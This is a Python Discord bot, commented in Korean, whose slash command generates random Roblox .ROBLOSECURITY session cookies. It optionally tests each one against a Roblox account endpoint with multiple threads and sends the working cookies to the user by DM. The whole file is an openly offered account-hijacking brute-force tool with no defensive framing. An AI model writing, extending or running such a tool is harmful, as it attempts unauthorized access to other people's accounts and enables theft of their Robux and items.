import os
import discord
from discord import app_commands
from discord.ext import commands
import random
import string
import threading
from queue import Queue
import requests
import asyncio

# 환경변수로 토큰 가져오기 (Zeabur에서 설정)
TOKEN = os.environ.get('DISCORD_TOKEN')

intents = discord.Intents.default()
bot = commands.Bot(command_prefix='!', intents=intents)

# 전역 변수
INTRO = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
LETTERS = 'ABCDEF'
CHECK_URL = 'https://accountinformation.roblox.com/v1/birthdate'

cookie_queue = Queue()
valid_cookies = []
lock = threading.Lock()

def generate_cookie():
    return INTRO + ''.join(random.choices(LETTERS + string.digits, k=732))

def check_login(cookie):
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'User-Agent': 'Mozilla/5.0'
    }
    try:
        res = requests.get(CHECK_URL, headers=headers, timeout=5)
        return res.status_code == 200
    except:
        return False

def worker():
    while True:
        cookie = cookie_queue.get()
        if cookie is None:
            break
        if check_login(cookie):
            with lock:
                valid_cookies.append(cookie)
        cookie_queue.task_done()

@bot.event
async def on_ready():
    print(f'{bot.user} 로그인 성공!')
    await bot.tree.sync()
    print('슬래시 커맨드 등록 완료!')

@bot.tree.command(name="쿠키랜덤", description="랜덤 쿠키 생성 및 선택적으로 로그인 체크해서 DM으로 결과 전송")
@app_commands.describe(count="생성할 쿠키 개수 (1~1000)", checker="로그인 체크 여부 (on/off, 기본 off)")
async def cookie_random(interaction: discord.Interaction, count: int, checker: str = 'off'):
    if count < 1 or count > 1000:
        await interaction.response.send_message("1부터 1000 사이 숫자 넣어주세요", ephemeral=True)
        return
    
    checker = checker.lower()
    if checker not in ['on', 'off']:
        await interaction.response.send_message("체커는 'on' 아니면 'off'만 됩니다", ephemeral=True)
        return
    
    await interaction.response.send_message(f"쿠키 {count}개 생성 시작! 로그인 체크: {checker}", ephemeral=True)

    global valid_cookies
    valid_cookies = []

    # 쿠키 생성
    cookies = []
    for _ in range(count):
        cookies.append(generate_cookie())

    if checker == 'on':
        # 로그인 체크 시작
        for cookie in cookies:
            cookie_queue.put(cookie)
            
        num_threads = min(20, max(2, count // 50))
        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)

        # 비동기 대기
        while not cookie_queue.empty():
            await asyncio.sleep(1)

        # 종료 신호
        for _ in range(num_threads):
            cookie_queue.put(None)
        for t in threads:
            t.join()

        # 결과 텍스트 생성
        result_text = "=== 로그인 성공 쿠키 ===\n\n"
        if valid_cookies:
            for cookie in valid_cookies:
                result_text += f"{cookie}\n\n"
            result_text += f"\n총 {len(valid_cookies)}개의 유효 쿠키를 찾았습니다.\n"
        else:
            result_text = "유효한 쿠키를 찾지 못했습니다."
    else:
        # 그냥 생성한 쿠키들만 텍스트로
        result_text = "=== 생성된 쿠키 ===\n\n"
        for cookie in cookies:
            result_text += f"{cookie}\n\n"

    # 파일로 저장
    filename = f"cookies_{random.randint(1000,9999)}.txt"
    with open(filename, 'w') as f:
        f.write(result_text)

    # DM으로 파일 전송
    try:
        dm = await interaction.user.create_dm()
        await dm.send(f"요청하신 쿠키 {count}개 결과입니다.", file=discord.File(filename))
    except Exception as e:
        await interaction.followup.send(f"DM 전송 실패: {str(e)}", ephemeral=True)
        return
    
    # 임시 파일 삭제
    try:
        os.remove(filename)
    except:
        pass

    print(f"{interaction.user}님에게 DM 결과 전송 완료")

# 봇 실행
if __name__ == "__main__":
    bot.run(TOKEN)
